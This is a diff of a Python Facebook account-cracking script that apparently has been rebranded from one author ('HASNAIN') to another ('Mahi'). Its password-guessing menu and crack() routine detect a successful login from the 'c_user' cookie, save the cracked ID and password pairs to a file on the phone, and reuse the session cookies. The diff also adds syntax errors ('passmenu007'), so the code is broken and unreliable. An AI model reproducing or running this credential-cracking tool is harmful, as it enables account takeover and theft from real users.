@@ -1,4 +1,4 @@
-#DECOMPILE BY HASNAIN
+#DECOMPILE BY Mahi
 #FILE NAME,MIS MAHI)
 W = '\033[97;1m'
 R = '\033[91;1m'
@@ -204,8 +204,8 @@ def setting():
 		method.append('free')
 	else:
 		method.append('mobile')
-	passmenu()
-def passmenu():
+	passmenu007
+def passmenu():007
 	clear()
 	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
 	passmen=input('\n [#] Select Pass : ')
@@ -322,10 +322,10 @@ def crack(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [HASNAIN-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [MAHI-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/HASNAIN-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MAHI-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -446,10 +446,10 @@ class Main:
 			os.system("xdg-open http://Wa.me/+923197695286")
 			exit()
 		elif baloch in ["1", "01"]:
-			os.system("xdg-openhttps://www.youtube.com/@HasnainHacker8")
+			os.system("xdg-openhttps://www.youtube.com/@The-mahi334")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;37m    Type Your Channel Name")
+			print("\033[1;37m    Type Your chenle name mahi tricks")
 			print("")
 			input("\n\033[1;32m  Type Name \033[1;34m━━>  \033[1;33m")
 			time.sleep(2.1)
